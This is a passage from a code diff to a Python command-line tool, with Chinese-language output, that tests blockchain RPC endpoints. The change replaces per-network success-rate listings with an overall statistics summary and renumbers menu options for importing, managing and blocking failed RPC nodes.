+                print(f"\n{Fore.GREEN}✅ 初始化完成！已自动屏蔽 {disabled_count} 个失效RPC节点{Style.RESET_ALL}")
                 
-                # 按成功率排序
-                sorted_results = sorted(results.items(), key=lambda x: x[1]['success_rate'], reverse=True)
+                # 显示检测统计
+                print(f"\n{Back.CYAN}{Fore.BLACK} 📊 最终统计 📊 {Style.RESET_ALL}")
+                total_networks = len(rpc_results)
+                total_rpcs = sum(r['total_count'] for r in rpc_results.values())
+                working_rpcs = sum(r['available_count'] for r in rpc_results.values())
                 
-                for network_key, result in sorted_results:
-                    success_rate = result['success_rate']
-                    working_count = result['available_count']
-                    total_count = result['total_count']
-                    
-                    if success_rate == 100:
-                        status_icon = "🟢"
-                        status_color = Fore.GREEN
-                    elif success_rate >= 50:
-                        status_icon = "🟡"
-                        status_color = Fore.YELLOW
-                    else:
-                        status_icon = "🔴"
-                        status_color = Fore.RED
-                    
-                    print(f"\n{status_icon} {Fore.CYAN}{result['name']}{Style.RESET_ALL}")
-                    print(f"   成功率: {status_color}{success_rate:.1f}%{Style.RESET_ALL} ({working_count}/{total_count})")
-                    
-                    if result['failed_rpcs']:
-                        print(f"   {Fore.RED}失效RPC:{Style.RESET_ALL}")
-                        for failed_rpc in result['failed_rpcs'][:3]:  # 只显示前3个
-                            print(f"     • {failed_rpc[:60]}...")
-                        if len(result['failed_rpcs']) > 3:
-                            print(f"     • ... 还有 {len(result['failed_rpcs']) - 3} 个")
-                            
-            elif choice == '4':
+                print(f"🌐 检测网络: {Fore.CYAN}{total_networks}{Style.RESET_ALL} 个")
+                print(f"📡 总RPC数: {Fore.CYAN}{total_rpcs}{Style.RESET_ALL} 个")
+                print(f"✅ 可用RPC: {Fore.GREEN}{working_rpcs}{Style.RESET_ALL} 个")
+                print(f"❌ 失效RPC: {Fore.RED}{total_rpcs - working_rpcs}{Style.RESET_ALL} 个")
+                print(f"📊 总体成功率: {Fore.YELLOW}{working_rpcs/total_rpcs*100:.1f}%{Style.RESET_ALL}")
+                
+            elif choice == '2':
                 # 检查并管理RPC数量不足的链条
                 self.manage_insufficient_rpc_chains()
                 
-            elif choice == '5':
+            elif choice == '3':
                 # 从ChainList数据批量导入RPC
                 self.import_rpcs_from_chainlist()
                 
-            elif choice == '6':
+            elif choice == '4':
                 # 管理被拉黑的RPC
                 self.manage_blocked_rpcs()
                 
@@ -4089,7 +5792,7 @@ esac
                             status_color = Fore.RED
                             status_icon = "❌"
                             status_text = "无可用RPC"
-                        
+                    
                         # 实时显示每个网络的连接状态
                         progress = f"[{completed_count:2d}/{total_networks}]"
                         print(f"  {Fore.CYAN}{progress}{Style.RESET_ALL} {status_color}{status_icon} {network_info['name']:<35}{Style.RESET_ALL} {status_color}{status_text}{Style.RESET_ALL}")
